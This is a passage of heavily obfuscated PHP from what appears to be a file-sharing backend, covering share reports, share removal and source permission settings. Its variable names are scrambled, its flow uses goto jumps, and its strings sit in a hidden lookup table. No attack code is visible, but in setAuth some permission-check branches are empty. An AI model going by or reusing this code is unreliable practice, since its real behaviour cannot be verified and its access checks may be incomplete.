($CÖ‹—Ä½ñ[$a‚ùëó¶‹À[470]] != $a‚ùëó¶‹À[83]) { return; } $c¬¸±Ä•Œ… = $C˜±–¯Èï[$a‚ùëó¶‹À[416]][$a‚ùëó¶‹À[394]]; goto bÁ¼‹ÂšäÄ; bÁ¼‹ÂšäÄ: if ($C˜±–¯Èï[$a‚ùëó¶‹À[416]][$a‚ùëó¶‹À[29]] != $a‚ùëó¶‹À[171]) { $aå‹˜ãÍÖ = $this->_folderReport($c¬¸±Ä•Œ…); if (!$aå‹˜ãÍÖ) { return; } show_json(LNG($a‚ùëó¶‹À[2285]) . $a‚ùëó¶‹À[2286] . $aå‹˜ãÍÖ, !1); } $f‰Å•ÅÛ¶¡ = Model($a‚ùëó¶‹À[778])->fileInfoGet($C˜±–¯Èï[$a‚ùëó¶‹À[416]][$a‚ùëó¶‹À[394]]); if (!$f‰Å•ÅÛ¶¡) { return; } goto a¼Ò—ä‘§ñ; B¥ÃĞ‡Ì®: } private function _folderReport($fÂåÉ¼‡‡‰) { goto dšĞà‚ë”˜; a¦Î÷Áåî¤: $fŠÌ°ôï† = array_to_keyvalue($DÔŞ‡‡§à‚, $D÷ÌŸÅŞé»[33], $D÷ÌŸÅŞé»[28]); $fŠÌ°ôï†[] = $f‡áœ–Ÿé[$D÷ÌŸÅŞé»[28]]; return implode($D÷ÌŸÅŞé»[8], $fŠÌ°ôï†); goto bèÙ–“ÔÌ‹; dšĞà‚ë”˜: $D÷ÌŸÅŞé» =& $_SERVER[åÌÛ»ô¢‚ö™]; $D»ÍáÏôô = array($D÷ÌŸÅŞé»[444] => array($D÷ÌŸÅŞé»[947], 0), $D÷ÌŸÅŞé»[716] => 3); $f‰‚¦“‡ƒ = Model($D÷ÌŸÅŞé»[2288])->where($D»ÍáÏôô)->field($D÷ÌŸÅŞé»[444])->select(); goto e©´Šğ‰Ë; e©´Šğ‰Ë: if (!$f‰‚¦“‡ƒ) { return !1; } $f‰‚¦“‡ƒ = array_to_keyvalue($f‰‚¦“‡ƒ, $D÷ÌŸÅŞé»[33], $D÷ÌŸÅŞé»[444]); $D‰Éá–ÛÇ¢ = $D÷ÌŸÅŞé»[47] . $fÂåÉ¼‡‡‰ . $D÷ÌŸÅŞé»[47]; goto a‘¬Ö’‘È°; a‘¬Ö’‘È°: $D»ÍáÏôô = array($D÷ÌŸÅŞé»[444] => array($D÷ÌŸÅŞé»[7], $f‰‚¦“‡ƒ), $D÷ÌŸÅŞé»[485] => array($D÷ÌŸÅŞé»[382], "\45{$D‰Éá–ÛÇ¢}\x25"), $D÷ÌŸÅŞé»[422] => 0); $f‡áœ–Ÿé = Model($D÷ÌŸÅŞé»[778])->where($D»ÍáÏôô)->field($D÷ÌŸÅŞé»[2289])->find(); if (!$f‡áœ–Ÿé) { return !1; } goto BŠ–ÔÁÈ; BŠ–ÔÁÈ: $EŠƒ³³‚Åó = substr($f‡áœ–Ÿé[$D÷ÌŸÅŞé»[485]], strpos($f‡áœ–Ÿé[$D÷ÌŸÅŞé»[485]], $D‰Éá–ÛÇ¢)); $D»ÍáÏôô = array($D÷ÌŸÅŞé»[394] => array($D÷ÌŸÅŞé»[7], trim($EŠƒ³³‚Åó, $D÷ÌŸÅŞé»[47]))); $DÔŞ‡‡§à‚ = Model($D÷ÌŸÅŞé»[778])->where($D»ÍáÏôô)->field($D÷ÌŸÅŞé»[28])->select(); goto a¦Î÷Áåî¤; bèÙ–“ÔÌ‹: } protected function remove($aÏŞ¿º»İ) { goto eĞÃØåŒÌ; eĞÃØåŒÌ: $f ÖÑ¨ÑÓÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($aÏŞ¿º»İ)) { $aÏŞ¿º»İ = array($f ÖÑ¨ÑÓÒ[7], $aÏŞ¿º»İ); } $BäÈƒ¸İ°µ = array($f ÖÑ¨ÑÓÒ[465] => $aÏŞ¿º»İ); goto F‰‹š®ÑÀ; dàÅŞ†¹: for ($D•âğÍÇé¨ = 0; $D•âğÍÇé¨ < count($e–ÚÉìÒ‡Ñ); $D•âğÍÇé¨++) { $cÚ»ÆŠ‰ = $this->getInfo($e–ÚÉìÒ‡Ñ[$D•âğÍÇé¨]); if ($cÚ»ÆŠ‰[$f ÖÑ¨ÑÓÒ[472]] == $f ÖÑ¨ÑÓÒ[83]) { Model($f ÖÑ¨ÑÓÒ[531])->eventShare($cÚ»ÆŠ‰[$f ÖÑ¨ÑÓÒ[394]], $f ÖÑ¨ÑÓÒ[2276]); } if ($cÚ»ÆŠ‰[$f ÖÑ¨ÑÓÒ[470]] == $f ÖÑ¨ÑÓÒ[83]) { Model($f ÖÑ¨ÑÓÒ[531])->eventShare($cÚ»ÆŠ‰[$f ÖÑ¨ÑÓÒ[394]], $f ÖÑ¨ÑÓÒ[2275]); } } return $a†Ÿˆ¥õğ; goto A÷ñ†õÉ‰à; F‰‹š®ÑÀ: $a†Ÿˆ¥õğ = $this->where($BäÈƒ¸İ°µ)->delete(); if ($a†Ÿˆ¥õğ) { Model($f ÖÑ¨ÑÓÒ[562])->where(array($f ÖÑ¨ÑÓÒ[465] => $aÏŞ¿º»İ))->delete(); } $e–ÚÉìÒ‡Ñ = is_array($aÏŞ¿º»İ) ? $aÏŞ¿º»İ[1] : array($aÏŞ¿º»İ); goto dàÅŞ†¹; A÷ñ†õÉ‰à: } protected function removeBySource($B ÖÂ†Ì) { goto aº®ÕÔĞ½; aº®ÕÔĞ½: $dÈç‰ ˜Š– =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÉÀ²Ğõ˜ = array($dÈç‰ ˜Š–[408] => array($dÈç‰ ˜Š–[409], $B ÖÂ†Ì)); $f¢”—îã = $this->field($dÈç‰ ˜Š–[465])->where($CÉÀ²Ğõ˜)->select(); goto Cíß¡‹ôµ”; fàìÏÒ·«Œ: $this->where($CÉÀ²Ğõ˜)->delete(); Model($dÈç‰ ˜Š–[562])->where($CÉÀ²Ğõ˜)->delete(); goto a‰Şè›Ğô—; Cíß¡‹ôµ”: $f¢”—îã = array_to_keyvalue($f¢”—îã, $dÈç‰ ˜Š–[33], $dÈç‰ ˜Š–[465]); if (!$f¢”—îã) { return; } $CÉÀ²Ğõ˜ = array($dÈç‰ ˜Š–[464] => array($dÈç‰ ˜Š–[409], $f¢”—îã)); goto fàìÏÒ·«Œ; a‰Şè›Ğô—: } public function listAll($bÜğ’Ù½¢È) { goto d±™°İ†·Æ; e÷×‚š½‚©: $c©÷Æê¶‰ = $this->_makeOrder()->where($AôµùØè»Í)->selectPage(20); if (empty($c©÷Æê¶‰[$a÷àß£¬Ö½[370]])) { return array(); } $this->_listDataApply($c©÷Æê¶‰[$a÷àß£¬Ö½[370]]); goto d—¡‰—»ìâ; b¬ç«¼Ö¡¯: if ($bÜğ’Ù½¢È[$a÷àß£¬Ö½[729]]) { $C„¯™Š›¤Á = $bÜğ’Ù½¢È[$a÷àß£¬Ö½[473]] ? $bÜğ’Ù½¢È[$a÷àß£¬Ö½[473]] : strtotime(date($a÷àß£¬Ö½[2290])); $AôµùØè»Í[$a÷àß£¬Ö½[200]] = array($a÷àß£¬Ö½[336], array($bÜğ’Ù½¢È[$a÷àß£¬Ö½[729]], $C„¯™Š›¤Á)); } if ($bÜğ’Ù½¢È[$a÷àß£¬Ö½[29]]) { $AôµùØè»Í[$bÜğ’Ù½¢È[$a÷àß£¬Ö½[29]]] = 1; } else { $AôµùØè»Í[] = array($a÷àß£¬Ö½[470] => array($a÷àß£¬Ö½[947], 0), $a÷àß£¬Ö½[472] => array($a÷àß£¬Ö½[947], 0), $a÷àß£¬Ö½[2266] => $a÷àß£¬Ö½[2223]); } if ($bÜğ’Ù½¢È[$a÷àß£¬Ö½[2219]]) { $AôµùØè»Í[] = array($a÷àß£¬Ö½[467] => $bÜğ’Ù½¢È[$a÷àß£¬Ö½[2219]], $a÷àß£¬Ö½[1368] => array($a÷àß£¬Ö½[382], "\45{$bÜğ’Ù½¢È[$a÷àß£¬Ö½[2219]]}\45"), $a÷àß£¬Ö½[2266] => $a÷àß£¬Ö½[2223]); } goto e÷×‚š½‚©; d—¡‰—»ìâ: return $c©÷Æê¶‰; goto eÛ ˜‡Â®ƒ; d±™°İ†·Æ: $a÷àß£¬Ö½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AôµùØè»Í = array(); if ($bÜğ’Ù½¢È[$a÷àß£¬Ö½[1465]]) { $AôµùØè»Í[$a÷àß£¬Ö½[1465]] = $bÜğ’Ù½¢È[$a÷àß£¬Ö½[1465]]; } goto b¬ç«¼Ö¡¯; eÛ ˜‡Â®ƒ: } public function listDataApply($FÃ‹¿‹‡÷) { $this->_listDataApply($FÃ‹¿‹‡÷); return $FÃ‹¿‹‡÷; } private function _listDataApply(&$c’¹ÆŸ´Î) { goto B‘åŸ†ÉŒ; B‘åŸ†ÉŒ: $aŠ¤Ô–‡† =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÜÀ®²ì¶ã = array_to_keyvalue($c’¹ÆŸ´Î, $aŠ¤Ô–‡†[33], $aŠ¤Ô–‡†[1465]); $fÇ¦õ‹‡¬ = Model($aŠ¤Ô–‡†[503])->userListInfo(array_unique($cÜÀ®²ì¶ã)); goto Dœµ¿¯ùÅ; Dœµ¿¯ùÅ: $b‘‡Ä’¹Ò÷ = array_to_keyvalue($c’¹ÆŸ´Î, $aŠ¤Ô–‡†[33], $aŠ¤Ô–‡†[394]); $DØÖšÊº™İ = Model($aŠ¤Ô–‡†[778])->sourceListInfo($b‘‡Ä’¹Ò÷, !0); foreach ($c’¹ÆŸ´Î as &$eĞà‹–—¢Î) { $c“ù°ß¤£Ì = $eĞà‹–—¢Î[$aŠ¤Ô–‡†[1465]]; $eĞà‹–—¢Î[$aŠ¤Ô–‡†[2291]] = $fÇ¦õ‹‡¬[$c“ù°ß¤£Ì] ? $fÇ¦õ‹‡¬[$c“ù°ß¤£Ì] : !1; $FÅ¤‘öÚ = $eĞà‹–—¢Î[$aŠ¤Ô–‡†[394]]; $eĞà‹–—¢Î[$aŠ¤Ô–‡†[416]] = $DØÖšÊº™İ[$FÅ¤‘öÚ] ? $DØÖšÊº™İ[$FÅ¤‘öÚ] : !1; } goto cÇ‰¶Ëğ­; cÇ‰¶Ëğ­: unset($eĞà‹–—¢Î); goto EàÎ’ˆÈŠ; EàÎ’ˆÈŠ: } private function _makeOrder($aŒ¥Ö¦¨Üß = '') { goto f”œÍ°Ä®Å; E÷Üå¾·ËŸ: $aŒ¥Ö¦¨Üß = $aŒ¥Ö¦¨Üß . "{$Bç…©¡³§æ}\x20{$D²Ù½áÌ™}"; return $this->order($aŒ¥Ö¦¨Üß); goto B¾£ÅÇ©À; BœÊ²Šœ¾­: $Bç…©¡³§æ = Input::get($bÁäÇÅ½Ü[432], $bÁäÇÅ½Ü[7], $bÁäÇÅ½Ü[414], $CíĞÃàó”); $D²Ù½áÌ™ = Input::get($bÁäÇÅ½Ü[433], $bÁäÇÅ½Ü[7], $bÁäÇÅ½Ü[2292], array($bÁäÇÅ½Ü[2218], $bÁäÇÅ½Ü[429])); $D²Ù½áÌ™ = $E³¦™¬“®½[$D²Ù½áÌ™]; goto E÷Üå¾·ËŸ; f”œÍ°Ä®Å: $bÁäÇÅ½Ü =& $_SERVER[åÌÛ»ô¢‚ö™]; $CíĞÃàó” = array($bÁäÇÅ½Ü[200], $bÁäÇÅ½Ü[473], $bÁäÇÅ½Ü[2278], $bÁäÇÅ½Ü[2279]); $E³¦™¬“®½ = array($bÁäÇÅ½Ü[427] => $bÁäÇÅ½Ü[428], $bÁäÇÅ½Ü[429] => $bÁäÇÅ½Ü[430]); goto BœÊ²Šœ¾­; B¾£ÅÇ©À: } public function reportAdd($e™Ü‹À”) { $D‚Óõ˜ŠáĞ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c± ¯Ãäá“ = array($D‚Óõ˜ŠáĞ[465] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[465]], $D‚Óõ˜ŠáĞ[1465] => USER_ID); if (Model($D‚Óõ˜ŠáĞ[2288])->where($c± ¯Ãäá“)->find()) { return !1; } $B‘ÒÒ‡Åš— = array($D‚Óõ˜ŠáĞ[465] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[465]], $D‚Óõ˜ŠáĞ[1368] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[1368]], $D‚Óõ˜ŠáĞ[394] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[394]], $D‚Óõ˜ŠáĞ[444] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[444]], $D‚Óõ˜ŠáĞ[1465] => USER_ID, $D‚Óõ˜ŠáĞ[29] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[29]], $D‚Óõ˜ŠáĞ[430] => $e™Ü‹À”[$D‚Óõ˜ŠáĞ[430]]); return Model($D‚Óõ˜ŠáĞ[2288])->add($B‘ÒÒ‡Åš—); } public function reportList($d¼ôæ”º…) { goto cá›Ëéóˆ; eè±ŠÜÉÈ: $FİÄ§ç«£ = array($fÉÙàõ…–[427] => $fÉÙàõ…–[428], $fÉÙàõ…–[429] => $fÉÙàõ…–[430]); $E¾«ÒàÁ‘Ø = $fÉÙàõ…–[2296] . $FİÄ§ç«£[$C–¬ÚÍğìÃ]; $Cœ¯“¬â‚Ó = Model($fÉÙàõ…–[2288])->where($CÊ±‚²·Ö…)->order($E¾«ÒàÁ‘Ø)->selectPage(20); goto FÖä²¬Ğ÷Ş; cá›Ëéóˆ: $fÉÙàõ…– =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÊ±‚²·Ö… = array(); if ($d¼ôæ”º…[$fÉÙàõ…–[729]]) { $CÒ»Ã›Îù = $d¼ôæ”º…[$fÉÙàõ…–[473]] ? $d¼ôæ”º…[$fÉÙàõ…–[473]] : strtotime(date($fÉÙàõ…–[2290])); $CÊ±‚²·Ö…[$fÉÙàõ…–[200]] = array($fÉÙàõ…–[336], array($d¼ôæ”º…[$fÉÙàõ…–[729]], $CÒ»Ã›Îù)); } goto C–²ëÄšÊ; C–²ëÄšÊ: if (isset($d¼ôæ”º…[$fÉÙàõ…–[29]]) && in_array($d¼ôæ”º…[$fÉÙàõ…–[29]], array($fÉÙàõ…–[83], $fÉÙàõ…–[2293], $fÉÙàõ…–[2294], $fÉÙàõ…–[2295], $fÉÙàõ…–[1953]))) { $CÊ±‚²·Ö…[$fÉÙàõ…–[29]] = $d¼ôæ”º…[$fÉÙàõ…–[29]]; } if (isset($d¼ôæ”º…[$fÉÙàõ…–[716]]) && in_array($d¼ôæ”º…[$fÉÙàõ…–[716]], array($fÉÙàõ…–[494], $fÉÙàõ…–[83], $fÉÙàõ…–[2293], $fÉÙàõ…–[2294]))) { $CÊ±‚²·Ö…[$fÉÙàõ…–[716]] = $d¼ôæ”º…[$fÉÙàõ…–[716]]; } $C–¬ÚÍğìÃ = Input::get($fÉÙàõ…–[433], $fÉÙàõ…–[7], $fÉÙàõ…–[2292], array($fÉÙàõ…–[2218], $fÉÙàõ…–[429])); goto eè±ŠÜÉÈ; FÖä²¬Ğ÷Ş: if (empty($Cœ¯“¬â‚Ó[$fÉÙàõ…–[370]])) { return array(); } $this->_listDataApply($Cœ¯“¬â‚Ó[$fÉÙàõ…–[370]]); return $Cœ¯“¬â‚Ó; goto fèøƒ˜¬ßµ; fèøƒ˜¬ßµ: } public function reportStatus($AšßéÔ›áÄ) { goto b½×¹Ò÷À„; d‹™¿â»ˆ’: return $EÅóõÖÈ¿; goto AáŠÊ·çãï; dáñŞÌ‰‰Ò: if (!$A¥”‰îä‘) { return !1; } $A œŞÕÃ“Ü = array($b¶Û¿ŠÅ´[716] => $AšßéÔ›áÄ[$b¶Û¿ŠÅ´[716]]); if ($AšßéÔ›áÄ[$b¶Û¿ŠÅ´[716]] == $b¶Û¿ŠÅ´[2294] && $A¥”‰îä‘[$b¶Û¿ŠÅ´[716]] == $b¶Û¿ŠÅ´[2294]) { $A œŞÕÃ“Ü[$b¶Û¿ŠÅ´[716]] = 0; } goto FÎ×§ãóÀ; FÎ×§ãóÀ: $EÅóõÖÈ¿ = Model($b¶Û¿ŠÅ´[2288])->where($d¥ˆö¸ïâ)->save($A œŞÕÃ“Ü); if ($AšßéÔ›áÄ[$b¶Û¿ŠÅ´[716]] == $b¶Û¿ŠÅ´[2293]) { if ($A¥”‰îä‘[$b¶Û¿ŠÅ´[444]] != $b¶Û¿ŠÅ´[494] && $this->shareFileMeta($A¥”‰îä‘[$b¶Û¿ŠÅ´[444]])) { $this->shareFileMeta($A¥”‰îä‘[$b¶Û¿ŠÅ´[444]], 0); } $this->remove($A¥”‰îä‘[$b¶Û¿ŠÅ´[465]]); return !0; } if ($EÅóõÖÈ¿ && $AšßéÔ›áÄ[$b¶Û¿ŠÅ´[716]] == $b¶Û¿ŠÅ´[2294]) { $Eª÷·ÃÃÕÖ = $A œŞÕÃ“Ü[$b¶Û¿ŠÅ´[716]] == $b¶Û¿ŠÅ´[2294] ? 1 : 0; $this->shareFileMeta($A¥”‰îä‘[$b¶Û¿ŠÅ´[444]], $Eª÷·ÃÃÕÖ); $this->removeByFile($A¥”‰îä‘[$b¶Û¿ŠÅ´[444]]); } goto d‹™¿â»ˆ’; b½×¹Ò÷À„: $b¶Û¿ŠÅ´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d¥ˆö¸ïâ = array($b¶Û¿ŠÅ´[392] => $AšßéÔ›áÄ[$b¶Û¿ŠÅ´[392]]); $A¥”‰îä‘ = Model($b¶Û¿ŠÅ´[2288])->where($d¥ˆö¸ïâ)->field($b¶Û¿ŠÅ´[2297])->find(); goto dáñŞÌ‰‰Ò; AáŠÊ·çãï: } private function removeByFile($dœğÌº±“) { goto FŞí´À§¿; FŞí´À§¿: $BÌ«Éğ¼£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c‘ŞùÉ¶ªß = Model($BÌ«Éğ¼£[778])->where(array($BÌ«Éğ¼£[444] => $dœğÌº±“))->field($BÌ«Éğ¼£[394])->select(); $eÛ»Ùëõê = array_to_keyvalue($c‘ŞùÉ¶ªß, $BÌ«Éğ¼£[33], $BÌ«Éğ¼£[394]); goto Cãİºº‘„“; EÑ¨ã¬Ø£·: $E»ï¬ÜòĞ¨ = array_to_keyvalue($c‘ŞùÉ¶ªß, $BÌ«Éğ¼£[33], $BÌ«Éğ¼£[465]); $this->remove($E»ï¬ÜòĞ¨); goto eÓÀƒÃˆË; Cãİºº‘„“: $AÉÊêŸ´éŞ = array($BÌ«Éğ¼£[394] => array($BÌ«Éğ¼£[7], $eÛ»Ùëõê), $BÌ«Éğ¼£[470] => 1); $c‘ŞùÉ¶ªß = Model($BÌ«Éğ¼£[2115])->where($AÉÊêŸ´éŞ)->field($BÌ«Éğ¼£[465])->select(); if (empty($c‘ŞùÉ¶ªß)) { return; } goto EÑ¨ã¬Ø£·; eÓÀƒÃˆË: } private function shareFileMeta($f‹ĞĞìÂå¯, $eºéİ¯˜ï = null) { $E«êæ¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CŸÀŞËŠïù = array($E«êæ¬[444] => $f‹ĞĞìÂå¯, $E«êæ¬[89] => $E«êæ¬[2298]); if (is_null($eºéİ¯˜ï)) { return Model($E«êæ¬[2299])->where($CŸÀŞËŠïù)->find(); } $CŸÀŞËŠïù[$E«êæ¬[375]] = $eºéİ¯˜ï; Model($E«êæ¬[2299])->add($CŸÀŞËŠïù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\x63\x65\x5f\x61\165\x74\x68"; public function getAuth($FŒĞÇ‘…©‹) { goto AŸáœøÎİ‚; a²öŒ§ñ: return $FÏ†ö¨™Î; goto f‚¦£áÆ¯–; aÊë… œù‡: $b‡˜ÜŠÅ÷Ä = $this->field($F Æªãá“°)->order($EÔê¹ÆÀˆÎ[392])->where($E—Ã¹´‚§è)->select(); $FÏ†ö¨™Î = array(); $d®¶’‚²¸„ = array(); goto C‡õ…‹êî×; AŸáœøÎİ‚: $EÔê¹ÆÀˆÎ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F Æªãá“° = $EÔê¹ÆÀˆÎ[2300]; $E—Ã¹´‚§è = array($EÔê¹ÆÀˆÎ[394] => $FŒĞÇ‘…©‹); goto aÊë… œù‡; C‡õ…‹êî×: $cƒà‹¸Ö« = 2 << 25; foreach ($b‡˜ÜŠÅ÷Ä as $BŸ©ô¸Î©¾) { goto fîÒÚáó; fîÒÚáó: $c—ŸîÊğÓ = Model($EÔê¹ÆÀˆÎ[2301])->listData($BŸ©ô¸Î©¾[$EÔê¹ÆÀˆÎ[2282]]); if (!$c—ŸîÊğÓ) { continue; } $FÏ†ö¨™Î[] = $BŸ©ô¸Î©¾; goto f†ã¢ÈÔ¯; Dò´’Ş»Ù½: if ($BŸ©ô¸Î©¾[$EÔê¹ÆÀˆÎ[396]] == SourceModel::TYPE_USER && $BŸ©ô¸Î©¾[$EÔê¹ÆÀˆÎ[482]] == $EÔê¹ÆÀˆÎ[494]) { $E·ô¨ƒ’ñÒ = 0; } $d®¶’‚²¸„[] = $c—ŸîÊğÓ[$EÔê¹ÆÀˆÎ[401]] + $E·ô¨ƒ’ñÒ; goto FÅÜ‹ì‘ˆ­; f†ã¢ÈÔ¯: $E·ô¨ƒ’ñÒ = 0; if ($BŸ©ô¸Î©¾[$EÔê¹ÆÀˆÎ[396]] == SourceModel::TYPE_GROUP) { $E·ô¨ƒ’ñÒ = $cƒà‹¸Ö« * 2; } if ($BŸ©ô¸Î©¾[$EÔê¹ÆÀˆÎ[396]] == SourceModel::TYPE_USER) { $E·ô¨ƒ’ñÒ = $cƒà‹¸Ö«; } goto Dò´’Ş»Ù½; FÅÜ‹ì‘ˆ­: } array_multisort($d®¶’‚²¸„, SORT_DESC, $FÏ†ö¨™Î); goto a²öŒ§ñ; f‚¦£áÆ¯–: } public function setAuth($D˜ÙÌÚÀ‘, $fˆ‘·ì¸) { goto AÑ¿®óŠ“Œ; d»‚”¨ö†±: if ($fóÌ‚‰´Ûß != $bôÜğ®º’ø) { $C°¥¯¤ƒÌ = array($A´ùÈˆ‹©¿[2138] => $fóÌ‚‰´Ûß); $CÙ·µ‰„ß = Model($A´ùÈˆ‹©¿[2217])->field($A´ùÈˆ‹©¿[1465])->where($C°¥¯¤ƒÌ)->select(); $CÙ·µ‰„ß = array_to_keyvalue($CÙ·µ‰„ß, $A´ùÈˆ‹©¿[33], $A´ùÈˆ‹©¿[1465]); } $bïœÀ‰Ìî× = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $a¶öÈ¹Ö’ = array(); goto D²ÚŞÃãœ; D²ÚŞÃãœ: foreach ($fˆ‘·ì¸ as $a£‡ÆÑŠß«) { if (!in_array($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[396]], $bïœÀ‰Ìî×)) { show_json(LNG($A´ùÈˆ‹©¿[2302]), !1); } if ($fóÌ‚‰´Ûß != $bôÜğ®º’ø) { if ($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[396]] == SourceModel::TYPE_GROUP) { } if ($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[482]] != 0 && !in_array($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[482]], $CÙ·µ‰„ß)) { } } if ($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[482]] == 0) { $a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[396]] = SourceModel::TYPE_USER; } $a¶öÈ¹Ö’[] = array($A´ùÈˆ‹©¿[394] => $D˜ÙÌÚÀ‘, $A´ùÈˆ‹©¿[396] => intval($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[396]]), $A´ùÈˆ‹©¿[482] => intval($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[482]]), $A´ùÈˆ‹©¿[2282] => intval($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[2282]]) ? intval($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[2282]]) : 0, $A´ùÈˆ‹©¿[2283] => intval($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[2283]]) ? intval($a£‡ÆÑŠß«[$A´ùÈˆ‹©¿[2283]]) : -1); } $this->where(array($A´ùÈˆ‹©¿[408] => $D˜ÙÌÚÀ‘))->delete(); $this->addAll($a¶öÈ¹Ö’); goto fæÑàâÎõ; BàŠ÷ÀáœÄ: if ($F¨÷Š²¢ï”[$A´ùÈˆ‹©¿[396]] != SourceModel::TYPE_GROUP) { return !1; } $bôÜğ®º’ø = 1; $fóÌ‚‰´Ûß = $F¨÷Š²¢ï”[$A´ùÈˆ‹©¿[482]]; goto d»‚”¨ö†±; fæÑàâÎõ: return !0; goto C˜ƒ˜õ‰É; AÑ¿®óŠ“Œ: $A´ùÈˆ‹©¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F¨÷Š²¢ï” = Model($A´ùÈˆ‹©¿[1143])->sourceInfo($D˜ÙÌÚÀ‘); if (!$F¨÷Š²¢ï”) { return !1; } goto BàŠ÷ÀáœÄ; C˜ƒ˜õ‰É: } public function authClear($eÏ£Áğ™) { $Bºˆõ¶„ÄÍ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C“ÁÒê¶Š = Model($Bºˆõ¶„ÄÍ[1143])->sourceInfo($eÏ£Áğ™); $cŒ‹Œˆá„ = array($eÏ£Áğ™); if ($C“ÁÒê¶Š[$Bºˆõ¶„ÄÍ[395]] == $Bºˆõ¶„ÄÍ[83]) { $FÊÌ›Ú ´ = array($Bºˆõ¶„ÄÍ[551] => array($Bºˆõ¶„ÄÍ[509], $C“ÁÒê¶Š[$Bºˆõ¶„ÄÍ[485]] . $eÏ£Áğ™ . $Bºˆõ¶„ÄÍ[510])); $cŒ‹Œˆá„ = Model($Bºˆõ¶„ÄÍ[1143])->field($Bºˆõ¶„ÄÍ[408])->where($FÊÌ›Ú ´)->getField($Bºˆõ¶„ÄÍ[394], !0); $cŒ‹Œˆá„[] = $eÏ£Áğ™; } $this->where(array($Bºˆõ¶„ÄÍ[408] => array($Bºˆõ¶„ÄÍ[409], $cŒ‹Œˆá„)))->delete(); return !0; } public function getAllChildren($b …¨…Â–) { goto C®­Êğ§ğõ; b«Â¢•ÒšÍ: return $this->sourceListAuth($eæ†µ”•Ç¢); goto BÚ‰İŸİ„á; c¡š–šÚ: if (!$a¿–Ş´½) { return array(); } $BÂ¶ßæˆ¹ = $CäÜºÊ›§[2303]; $A–ÃÂ¾ = array($CäÜºÊ›§[394] => array($CäÜºÊ›§[7], $a¿–Ş´½), $CäÜºÊ›§[422] => $CäÜºÊ›§[494]); goto B«º¥‡ÆÒÃ; B«º¥‡ÆÒÃ: $B§è”ß²¿ = Model($CäÜºÊ›§[778])->field($BÂ¶ßæˆ¹)->where($A–ÃÂ¾)->select(); $eæ†µ”•Ç¢ = array($b …¨…Â–); foreach ($B§è”ß²¿ as $aõÍ÷¦‹Øã) { foreach ($EÓ¿õñâñ™ as $B†™Ä²ß„¡) { $f…˜’ä»Å¸ = $CäÜºÊ›§[47] . $B†™Ä²ß„¡ . $CäÜºÊ›§[47]; $dÔÅ¨ïµŠœ = $aõÍ÷¦‹Øã[$CäÜºÊ›§[485]] . $aõÍ÷¦‹Øã[$CäÜºÊ›§[394]] . $CäÜºÊ›§[47]; if (strstr($dÔÅ¨ïµŠœ, $f…˜’ä»Å¸)) { $eæ†µ”•Ç¢[] = $aõÍ÷¦‹Øã[$CäÜºÊ›§[394]]; break; } } } goto b«Â¢•ÒšÍ; Dô×¼òĞôÕ: if ($FŒ²±’¹ñ÷[$CäÜºÊ›§[396]] != SourceModel::TYPE_GROUP) { return array(); } $cğëæ‰Á÷• = 1; $EÓ¿õñâñ™ = array($b …¨…Â–); goto EŒâ¿ºÔ„ò; C®­Êğ§ğõ: $CäÜºÊ›§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FŒ²±’¹ñ÷ = Model($CäÜºÊ›§[1143])->sourceInfo($b …¨…Â–); if ($FŒ²±’¹ñ÷[$CäÜºÊ›§[395]] != $CäÜºÊ›§[83]) { return $this->sourceListAuth(array($b …¨…Â–)); } goto Dô×¼òĞôÕ; EŒâ¿ºÔ„ò: if ($FŒ²±’¹ñ÷[$CäÜºÊ›§[487]] == $CäÜºÊ›§[494] && $FŒ²±’¹ñ÷[$CäÜºÊ›§[482]] != $cğëæ‰Á÷•) { $EÓ¿õñâñ™ = $this->groupChidldAllRootSource($FŒ²±’¹ñ÷[$CäÜºÊ›§[482]]); } $a¿–Ş´½ = $this->field($CäÜºÊ›§[394])->group($CäÜºÊ›§[394])->select(); $a¿–Ş´½ = array_to_keyvalue($a¿–Ş´½, $CäÜºÊ›§[33], $CäÜºÊ›§[394]); goto c¡š–šÚ; BÚ‰İŸİ„á: } private function sourceListAuth($bƒóôê°˜Õ) { goto E¹Ä¦Ú¥ïí; F÷œˆ›ØŒ„: $BŒœñ’Ó˜‚ = array(); foreach ($F‡›Ò¨ÇÉ as $CáÅ•ù­éÓ) { goto aƒÖ„ëÕ³œ; AÜÏÙŠàĞ: unset($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[416]]); $cø—ŸöŞ˜Ğ = $e†ÓµÓº»[$CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[394]]]; if (!$cø—ŸöŞ˜Ğ) { continue; } goto d¯†ÀÀ™õƒ; aƒÖ„ëÕ³œ: unset($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[404]]); unset($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[403]]); unset($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[401]]); goto AÜÏÙŠàĞ; EˆŠÈĞ°«¤: 